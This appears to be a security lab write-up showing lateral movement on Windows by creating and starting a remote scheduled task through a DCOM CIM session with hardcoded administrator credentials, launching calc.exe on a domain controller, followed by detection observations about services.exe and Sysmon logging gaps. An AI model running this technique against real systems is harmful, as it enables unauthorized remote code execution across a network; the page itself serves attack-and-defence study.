# WMI + NewScheduledTaskAction Lateral Movement

## WMI + NewScheduledTaskAction Lateral Movement

### Execution

On the victim system, let's run a simple loop to see when a new scheduled task gets added:

```csharp
$a=$null; while($a -eq $null) { $a=Get-ScheduledTask | Where-Object {$_.TaskName -eq "lateral"}; $a }
```

Now from the compromised victim system, let's execute code laterally:

{% code title="attacker\@remote" %}
```csharp
$connection = New-Cimsession -ComputerName "dc-mantvydas" -SessionOption (New-CimSessionOption -Protocol "DCOM") -Credential ((new-object -typename System.Management.Automation.PSCredential -ArgumentList @("administrator", (ConvertTo-SecureString -String "123456" -asplaintext -force)))) -ErrorAction Stop; register-scheduledTask -action (New-ScheduledTaskAction -execute "calc.exe" -cimSession $connection -WorkingDirectory "c:\windows\system32") -cimSession $connection -taskname "lateral"; start-scheduledtask -CimSession $connection -TaskName "lateral"
```
{% endcode %}

Graphic showing both of the above commands and also the process ancestry on the target system:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LPD4zLqh_uHh397YFCT%2F-LPDF5kLS4zuHFLnYLC9%2FPeek%202018-10-19%2022-24.gif?alt=media\&token=453435b7-c770-4719-ab79-d809d1e787d8)

### Observations

As usual, services.exe spawning unusual binaries should raise a wary defender's suspicion. You may also want consider monitoring for new scheduled tasks that get created on your systems:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LPD4zLqh_uHh397YFCT%2F-LPDFJIerhqNaFCFN_7q%2FScreenshot%20from%202018-10-19%2022-35-13.png?alt=media\&token=8e93fcee-73b5-4237-935e-74c9d1b66adc)

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LPDKo3pwQPfDeoBkEJM%2F-LPDKrRjEw_yCogdEwg7%2FScreenshot%20from%202018-10-19%2022-59-12.png?alt=media\&token=c97cb7dd-2221-41fb-bb67-da2aafeed8d4)

{% hint style="info" %}
Sysmon config master version 64 from [https://github.com/SwiftOnSecurity/sysmon-config](https://github.com/SwiftOnSecurity/sysmon-config) does not log the calc.exe Process Creation event being spawned by the services.exe
{% endhint %}



